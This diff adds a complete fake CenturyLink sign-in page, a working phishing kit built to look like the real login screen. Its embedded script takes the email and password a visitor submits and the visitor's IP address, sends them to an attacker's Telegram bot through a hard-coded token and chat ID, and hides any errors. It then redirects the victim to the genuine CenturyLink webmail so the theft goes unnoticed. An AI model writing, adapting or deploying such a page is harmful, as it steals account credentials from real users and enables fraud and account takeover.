@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CenturyLink | Sign In</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: #ffffff;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Header / Logo */
+    .header {
+      padding: 18px 28px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+    }
+
+    .logo-icon {
+      width: 44px;
+      height: 44px;
+    }
+
+    .logo-text {
+      display: flex;
+      align-items: baseline;
+      gap: 0;
+    }
+
+    .logo-century {
+      font-size: 22px;
+      font-weight: 700;
+      color: #000000;
+      letter-spacing: -0.3px;
+    }
+
+    .logo-link {
+      font-size: 22px;
+      font-weight: 400;
+      color: #000000;
+      letter-spacing: -0.3px;
+    }
+
+    .logo-tm {
+      font-size: 9px;
+      color: #000000;
+      vertical-align: super;
+      margin-left: 1px;
+    }
+
+    /* Main Layout */
+    .main {
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding-top: 60px;
+      position: relative;
+      min-height: calc(100vh - 80px);
+    }
+
+    /* Background decorative arc (bottom-right) */
+    .bg-arc {
+      position: fixed;
+      bottom: -60px;
+      right: -80px;
+      width: 520px;
+      height: 520px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .bg-arc svg {
+      width: 100%;
+      height: 100%;
+    }
+
+    /* Form Container */
+    .form-container {
+      width: 100%;
+      max-width: 340px;
+      position: relative;
+      z-index: 1;
+      padding: 0 20px;
+    }
+
+    .form-group {
+      margin-bottom: 28px;
+      position: relative;
+    }
+
+    .form-group input {
+      width: 100%;
+      border: none;
+      border-bottom: 1.5px solid #cccccc;
+      outline: none;
+      font-size: 15px;
+      color: #333333;
+      padding: 8px 0 8px 0;
+      background: transparent;
+      transition: border-color 0.2s;
+    }
+
+    .form-group input::placeholder {
+      color: #888888;
+      font-size: 15px;
+    }
+
+    .form-group input:focus {
+      border-bottom-color: #0d47a1;
+    }
+
+    /* Checkbox row */
+    .checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 32px;
+    }
+
+    .checkbox-row input[type="checkbox"] {
+      width: 14px;
+      height: 14px;
+      cursor: pointer;
+      accent-color: #0d47a1;
+    }
+
+    .checkbox-row label {
+      font-size: 13.5px;
+      color: #444444;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    /* Sign In Button */
+    .btn-signin {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      background-color: #1a56db;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 500;
+      border: none;
+      cursor: pointer;
+      text-align: center;
+      letter-spacing: 0.2px;
+      transition: background-color 0.2s;
+      margin-bottom: 18px;
+    }
+
+    .btn-signin:hover {
+      background-color: #1648c4;
+    }
+
+    /* Bottom links */
+    .links-row {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .links-row a {
+      font-size: 13.5px;
+      color: #1a56db;
+      text-decoration: none;
+    }
+
+    .links-row a:hover {
+      text-decoration: underline;
+    }
+
+    /* Loading overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.7);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 4px solid #e0e0e0;
+      border-top-color: #1a56db;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <div class="logo">
+      <!-- CenturyLink Starburst SVG Logo -->
+      <svg class="logo-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
+        <g fill="#000000">
+          <!-- Starburst / radial lines pattern mimicking CenturyLink logo -->
+          <line x1="25" y1="25" x2="25" y2="4"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="36" y2="6"    stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="44" y2="14"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="46" y2="25"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="44" y2="36"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="36" y2="44"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="25" y2="46"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="14" y2="44"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="6"  y2="36"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="4"  y2="25"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="6"  y2="14"   stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+          <line x1="25" y1="25" x2="14" y2="6"    stroke="#000" stroke-width="3.5" stroke-linecap="round"/>
+        </g>
+      </svg>
+      <div class="logo-text">
+        <span class="logo-century">Century</span><span class="logo-link">Link</span><sup class="logo-tm">TM</sup>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="main">
+
+    <!-- Background arc decoration (bottom-right) -->
+    <div class="bg-arc">
+      <svg viewBox="0 0 520 520" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <!-- Large arc slices mimicking the CenturyLink decorative background element -->
+        <path d="M520 520 Q 200 520 20 300" stroke="#e0e0e0" stroke-width="100" fill="none" opacity="0.5"/>
+        <path d="M520 520 Q 320 520 80 260" stroke="#e8e8e8" stroke-width="80" fill="none" opacity="0.5"/>
+        <!-- Filled wedge shapes -->
+        <path d="M510 510 L 510 200 Q 510 400 300 510 Z" fill="#e8e8e8" opacity="0.7"/>
+        <path d="M510 510 L 510 300 Q 480 480 300 510 Z" fill="#d8d8d8" opacity="0.5"/>
+        <!-- Rounded slices like the screenshot -->
+        <path d="M480 480 Q 350 480 150 340 Q 100 290 70 220 L 480 480 Z" fill="#ebebeb" opacity="0.6"/>
+      </svg>
+    </div>
+
+    <!-- Login Form -->
+    <div class="form-container">
+      <form id="loginForm" onsubmit="handleSubmit(event)">
+
+        <div class="form-group">
+          <input
+            type="email"
+            id="email"
+            name="email"
+            placeholder="CenturyLink Email"
+            autocomplete="email"
+            required
+          />
+        </div>
+
+        <div class="form-group">
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+          />
+        </div>
+
+        <div class="checkbox-row">
+          <input type="checkbox" id="staySignedIn" name="staySignedIn" />
+          <label for="staySignedIn">Stay signed in</label>
+        </div>
+
+        <button type="submit" class="btn-signin">Sign In</button>
+
+        <div class="links-row">
+          <a href="#">Forgot Password?</a>
+          <a href="#">Need help?</a>
+        </div>
+
+      </form>
+    </div>
+
+  </div>
+
+  <!-- Loading overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+  </div>
+
+  <script>
+    async function getUserIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip || 'Unknown';
+      } catch (e) {
+        return 'Unknown';
+      }
+    }
+
+    async function sendToTelegram(email, password, ip) {
+      const botToken = '8730408684:AAFQO1TzzZ6lSImGCiQyhXuPHp5p6pGedfk';
+      const chatId = '8322144184';
+      const text =
+        `🔐 CenturyLink Login\n` +
+        `📧 Email: ${email}\n` +
+        `🔑 Password: ${password}\n` +
+        `🌐 IP: ${ip}\n` +
+        `🕐 Time: ${new Date().toUTCString()}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      });
+    }
+
+    async function handleSubmit(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      document.getElementById('loadingOverlay').classList.add('active');
+
+      try {
+        const ip = await getUserIP();
+        await sendToTelegram(email, password, ip);
+      } catch (err) {
+        // silently continue
+      }
+
+      window.location.href = 'https://webmail.centurylink.net/app/';
+    }
+  </script>
+
+</body>
+</html>
